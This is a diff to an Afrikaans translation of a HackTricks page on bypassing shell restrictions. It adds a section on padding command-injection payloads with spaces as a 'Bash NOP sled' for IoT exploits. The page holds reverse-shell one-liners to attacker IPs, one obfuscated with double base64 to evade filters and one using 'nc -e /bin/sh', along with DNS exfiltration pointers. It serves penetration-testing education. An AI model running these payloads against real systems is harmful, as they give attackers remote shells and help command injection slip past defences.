@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Algemene Beperkings Omseilings
+## Algemene Beperkings Bypasses
 
-### Terugkeer Skulp
+### Terugskakel Shell
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -140,7 +140,7 @@ echo ${PATH:0:1} #/
 ```
 ### DNS data exfiltration
 
-Jy kan **burpcollab** of [**pingb**](http://pingb.in) gebruik, byvoorbeeld.
+Jy kan **burpcollab** of [**pingb**](http://pingb.in) gebruik byvoorbeeld.
 
 ### Builtins
 
@@ -294,9 +294,9 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Lees-Alleen/Geen-uitvoering/Distroless Bypass
+## Lees-Alleen/Geen Exec/Distroless Bypass
 
-As jy binne 'n lêerstelsel is met die **lees-alleen en geen-uitvoering beskermings** of selfs in 'n distroless houer, is daar steeds maniere om **arbitraire binaire lêers uit te voer, selfs 'n shell!:**
+As jy binne 'n lêerstelsel is met die **lees-alleen en geen exec beskermings** of selfs in 'n distroless houer, is daar steeds maniere om **arbitraire binaries uit te voer, selfs 'n shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -308,11 +308,33 @@ bypass-fs-protections-read-only-no-exec-distroless/
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
+## Ruimte-gebaseerde Bash NOP Sled ("Bashsledding")
+
+Wanneer 'n kwesbaarheid jou toelaat om gedeeltelik 'n argument te beheer wat uiteindelik `system()` of 'n ander shell bereik, mag jy nie die presiese offset weet waar uitvoering begin om jou payload te lees nie. Tradisionele NOP sleds (bv. `\x90`) werk **nie** in shell-sintaksis nie, maar Bash sal onskadelik lei spasie voor die uitvoering van 'n opdrag ignoreer.
+
+Daarom kan jy 'n *NOP sled vir Bash* skep deur jou werklike opdrag te prefix met 'n lang reeks spasië of tab karakters:
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+As 'n ROP-ketting (of enige geheue-korrosie-primitief) die instruksie-aanwyser enige plek binne die ruimteblok land, sal die Bash-parsser eenvoudig die spasie oorslaan totdat dit by `nc` kom, wat jou opdrag betroubaar uitvoer.
+
+Praktiese gebruiksgevalle:
+
+1. **Geheue-gemapte konfigurasie-blobs** (bv. NVRAM) wat oor prosesse toeganklik is.
+2. Situasies waar die aanvaller nie NULL-byte kan skryf om die payload te belyn nie.
+3. Ingebedde toestelle waar slegs BusyBox `ash`/`sh` beskikbaar is – hulle ignoreer ook lei-spasies.
+
+> 🛠️  Kombineer hierdie truuk met ROP gadgets wat `system()` aanroep om die ontploffingsbetroubaarheid op geheue-beperkte IoT-roeters dramaties te verhoog.
+
 ## Verwysings & Meer
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 - [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
